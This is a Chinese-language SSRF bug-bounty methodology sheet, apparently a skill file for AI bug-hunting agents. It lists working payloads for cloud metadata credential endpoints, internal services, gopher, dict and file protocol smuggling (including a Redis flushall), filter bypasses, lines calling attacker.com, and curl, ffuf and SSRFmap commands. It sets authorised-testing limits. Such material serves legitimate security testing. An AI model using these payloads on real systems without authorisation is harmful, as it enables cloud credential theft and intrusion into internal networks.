# SSRF / 服务端请求伪造（SSRF）

> 让服务器替你向「它能到、你不能到」的地方发请求。打到云元数据（AWS/GCP/Azure IMDS）→ 直接偷 IAM 临时凭据 → 高危到严重；打到内网未授权服务（Redis/MySQL）→ 可升级 RCE。赏金上，未授权 SSRF → 云元数据通常 P0（$3k–$20k），H1 平台 AWS metadata SSRF 报告 $5k–$50k 很普遍。

**取材来源**：[MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)、[elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)、[SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)；权威公开源 PayloadsAllTheThings / PortSwigger / HackTricks。

---

## 1. 触发信号

- 任何「URL 入参让服务端发请求」的功能：URL 预览 / 头像抓取 / 图片代理 / Webhook 回调测试 / RSS 订阅 / 远程文件导入 / PDF 生成（wkhtmltopdf、Puppeteer）/ 邮件预览（Open Graph fetch）。
- 参数名命中 `url`/`callback`/`return`/`redirect`/`feed`/`image`/`proxy`/`source` 等。
- 响应里回显了目标 URL 的内容、或服务端 User-Agent 是 `wkhtmltopdf`/`Headless Chrome`/`Java/1.x`（渲染器/HTTP 客户端指纹）`[本地 src-hunter]`。
- 响应头泄露内网主机名：`Via: 1.1 internal-proxy`、`X-Cache` 命中内网 host、`Server: internal-service` `[Claude-BugHunter]`。

> 关键区分：**服务器把 URL 回显进错误信息 ≠ SSRF**。`"The Web application at http://evil/x could not be found"` 只是字符串拼接，不是真的发起了出站请求。必须靠 OOB 回调确认 `[Claude-BugHunter]`。

**真实案例指纹** `[本地 src-hunter + Claude-BugHunter]`：

- Capital One（2019）：SSRF → `169.254.169.254/.../iam/security-credentials/` 拿 IAM 凭据 → S3 全量数据泄露
- Shopify Exchange `#341876`：截图服务 → GCP metadata → 容器 root（$25k）
- HackerOne Analytics `#2262382`：PDF 生成器注入 `<iframe>` → AWS metadata（$25k）
- Yahoo Mail：盲 SSRF → gopher → Redis 写 cron RCE（$15k）
- Reddit Matrix `#1960765`：`preview_url` 盲 SSRF 内网端口扫描（$6k）
- Confluence `CVE-2019-3396` / Jira `CVE-2019-8451`：模板注入 + SSRF（`makeRequest?url=`）
- 通用指纹：`?url=https://oob.attacker.cc/x` → OOB 收到 → 基本 SSRF；UA 含 `wkhtmltopdf`/`Headless Chrome` → 渲染器；`file:///etc/passwd` 返 200 → 协议白名单缺；`169.254.169.254` 返 token JSON → 云 metadata 可达

## 2. 高频入口点

**高危 URL 参数名** `[本地 src-hunter + Claude-Red]`：

```
url fetch image img proxy source path file callback webhook
next redirect continue return uri endpoint src feed host target
dest dest load data reference site html val validate domain page
port to out view dir origin img_url link site_url media_url
```

**功能场景（必查）** `[本地 src-hunter]`：头像/远程图片导入、URL 预览（聊天/评论）、Webhook、RSS/Atom、远程 PDF/Excel/视频导入、OAuth redirect / SAML ACS、服务器端图片处理（ImageMagick）、PDF 生成（wkhtmltopdf/Puppeteer）、邮件预览（Open Graph fetch）。

**API 路径模式** `[Claude-BugHunter]`：`/api/*/preview` `/fetch` `/import` `/webhook` `/proxy` `/render` `/link` `/screenshot` `/export` `/validate`。

**Host / X-Forwarded-\* 入口** `[本地 src-hunter]`：`Host` `X-Forwarded-Host` `X-Forwarded-For` `X-Forwarded-Proto` `X-Forwarded-Port` `X-Forwarded-Server` `X-Real-IP` `X-Original-URL` `X-Rewrite-URL` `True-Client-IP` `X-Client-IP` `Forwarded: for=...;host=...`。

**技术栈信号** `[Claude-BugHunter]`：K8s 聚合 API/metrics 端点、GCP 上跑 URL 抓取的 Compute Engine/GKE、Node/Python 的 `requests`/`node-fetch`/`axios`、headless 浏览器（Puppeteer/PhantomJS）做截图/PDF（极高价值）、XML/CSV 导入（XXE 式 SSRF）、OAuth/webhook 注册端点。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **埋 OOB 探针（永远第一步）**：`url=https://你的.interactsh.com/test`（或 Burp Collaborator / canarytoken），等 30–120s 看回调。收到 DNS 或 HTTP 请求 → 基本 SSRF 成立；否则即使报错回显 URL 也不能报 SSRF `[Claude-BugHunter]`。
2. **判定盲打 vs 全回显**：`url=https://example.com/` 看是否返回 `<title>Example Domain</title>`。回显 body = full-read（严重）；只有回调无 body = blind（需继续找内网可达点才值得报）`[Claude-BugHunter]`。
3. **内网探测**：`127.0.0.1`、`127.0.0.1:8080`、`10.0.0.1`、`172.16.0.1`、`192.168.0.1`、`[::1]`；常见端口 6379/9200/8500/6443/2379/9090 看响应差异判断端口开放 `[本地 src-hunter + Claude-BugHunter]`。
4. **云元数据（价值最高）**：AWS `169.254.169.254`、GCP `metadata.google.internal`、Azure `169.254.169.254/metadata`、阿里云 `100.100.100.200`、腾讯云 `metadata.tencentyun.com`。拿到 IAM 角色名即可停手，不继续取凭据 `[本地 src-hunter]`。
5. **评估升级（仅授权）**：协议走私（gopher/dict/file）打内网 Redis/MySQL/FastCGI，DNS rebinding / 302 重定向绕过过滤。
6. **降级原则**：被过滤 → 换 IP 表示法 → 换域名绕过 → 换协议 → 302 重定向 → DNS rebinding，逐层上。

## 4. Payload 区（每条标注出处）

### 4.1 OOB 基础探测 `[Claude-BugHunter]`

```bash
interactsh-client -v
curl -s "https://target.com/api/preview?url=https://YOUR_ID.oast.pro"
curl -s "https://target.com/api/fetch" -H "Content-Type: application/json" \
  -d '{"url":"https://YOUR_ID.oast.pro"}'
# 收到 DNS/HTTP 回调 = SSRF 成立；同时看是否回显 example.com 内容判定 full-read
```

### 4.2 内网探测 `[本地 src-hunter + Claude-BugHunter]`

```
http://127.0.0.1:6379      # Redis
http://127.0.0.1:9200/_cat/indices   # Elasticsearch
http://127.0.0.1:8500/v1/catalog/services  # Consul
http://127.0.0.1:6443/api/v1/namespaces     # K8s API
http://127.0.0.1:10250/pods                  # kubelet
http://127.0.0.1:2379/v2/keys                # etcd
http://127.0.0.1:15000/config_dump           # Envoy/Istio admin
file:///var/run/secrets/kubernetes.io/serviceaccount/token   # K8s SA token
```

### 4.3 云元数据 `[本地 src-hunter + Claude-BugHunter]`

```bash
# AWS IMDSv1（无认证）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # 角色名
http://169.254.169.254/latest/user-data
# AWS ECS task 凭据（环境变量 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI）
http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}

# GCP（必须带 Metadata-Flavor: Google 头）
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure（必须带 Metadata: true 头）
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# 阿里云 / 腾讯云
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://metadata.tencentyun.com/latest/meta-data/
```

### 4.4 协议走私 `[本地 src-hunter + Claude-Red]`

```
file:///etc/passwd
file:///proc/self/environ
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
gopher://127.0.0.1:6379/_INFO                       # Redis
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...  # 构造 Redis 命令
ldap://127.0.0.1:389/
sftp://attacker.com:11111/
tftp://attacker.com/file
```

### 4.5 Bypass 矩阵 `[本地 src-hunter + Claude-BugHunter + Claude-Red]`

| 防护 | 绕过 |
|---|---|
| 拦字面 `127.0.0.1` | 十进制 `2130706433` / 八进制 `0177.0.0.1` / 十六进制 `0x7f000001` / 简写 `127.1` / `0` |
| 拦 `localhost` | `localtest.me` / `127.0.0.1.nip.io` / `127.0.0.1.xip.io` / `[::1]` / `[::ffff:127.0.0.1]` |
| 拦 `169.254.169.254` | 十进制 `2852039166` / 十六进制 `0xA9FEA9FE` / 八进制 `0251.0376.0251.0376` / `[::ffff:169.254.169.254]` |
| URL 解析差异 | `http://evil.com@127.0.0.1/` / `http://127.0.0.1#evil.com` / `http://evil.com\@127.0.0.1/` / `http://evil.com\.127.0.0.1/` |
| 域名白名单 | `attacker.com#@127.0.0.1` / 子域 `legit-attacker.com.evil.com` |
| 仅允许 https | URL 编码 / 双重协议 / 302 重定向降级 http→gopher |
| 私网段关键字 | DNS rebinding：`http://7f000001.c0a80101.rbndr.us` / `make-<ip1>-<ip2>-rbndr.us` / `1u.ms` |
| 重定向过滤 | 攻击者域挂 302 到 `169.254.169.254` / gopher / file |
| AWS IMDSv2 | 试 v1（老实例未开 v2）；或 SSRF 参数支持 PUT 时先取 token |

## 5. 工具用法

```bash
# OOB 探测
interactsh-client -v                                     # 起监听，拿唯一域名
# 参数发现（每个候选参数一个独立 payload，避免无法归因）
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" -fs 0 -mc all
# 内网端口扫描（1–3 个目标 IP 验证即停，禁扫整段 /8）
for port in 22 80 443 3306 6379 9200; do
  curl -s "https://target.com/api?url=http://127.0.0.1:$port" -o /dev/null -w "%{http_code} $port\n"
done
# 协议走私 / 构造 gopher
python3 gopherus.py --exploit mysql     # 生成 MySQL 协议 gopher URL [本地 src-hunter]
# 专用工具
python3 ssrfmap.py -r request.txt -p url     # SSRFmap [Claude-Red]
```

> 纪律：SSRF 探测用**自己的** OOB 域名/interactsh，不用公共 DNSLog；盲打归因必须「一个参数一个 payload」逐个发、逐个 poll `[Claude-BugHunter]`。

## 6. 证据要求

**「已确认」必须满足**：OOB 平台收到带目标源 IP 的 DNS 或 HTTP 回调（截图含时间戳）；或响应回显内网/元数据内容（如 IAM 角色名）。盲打需证明「不同内网目标有不同响应差异」（如 `169.254.169.254` 返回 401 而其他目标返回 200）`[Claude-BugHunter]`。

**PoC 模板（云 metadata）** `[本地 src-hunter]`：

```http
POST /api/preview HTTP/1.1
Host: target.com
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

→ 200 OK（脱敏）：xxx-app-role-prod   ← 只证明拿到角色名，未进一步取凭据
```

**CVSS 参考** `[本地 src-hunter]`：未授权 SSRF→metadata→云控制 = 9.8 Critical；未授权 SSRF→内网端口扫描 = 7.5；认证 SSRF→内网 = 6.5；Host 注入→密码重置中毒 = 8.1。

**影响段要点**：说明可达 1) 内网段（端口扫描可行）2) 云 metadata（拿到角色名 xxx-app-role-prod）3) 内网 Redis/Mongo 端口（仅做可达探测，未发业务命令）；明确写「未尝试获取 IAM 临时凭据 / 未读取 secret」。

## 7. 合规边界 / 不要做的事

- **禁**：实际拿 IAM 临时凭据后调 AWS API（`aws s3 ls` 也算）。仅证明可达 metadata 端点 `[本地 src-hunter]`。
- **禁**：用 SSRF 触发任何「能改/能删」的内网服务（Redis FLUSHALL、写 SSH key、CONFIG SET）`[本地 src-hunter]`。
- **禁**：用 SSRF+gopher 扫整个内网 /8 段。1–3 个目标 IP 验证概念即停 `[本地 src-hunter]`。
- **禁**：实际投毒共享缓存；只在**自己的** cache key 上证明能投毒 `[本地 src-hunter]`。
- **禁**：Host 注入实际触发他人密码重置邮件（自己邮箱发自己 OK）`[本地 src-hunter]`。
- **禁**：滥用公共 DNSLog 平台。OOB 一律用自架 interactsh / Burp Collaborator `[Claude-BugHunter]`。
- 归因纪律：回调不能证明「哪个参数」是 sink，报告前必须逐个参数隔离复测并做阴性对照 `[Claude-BugHunter]`。
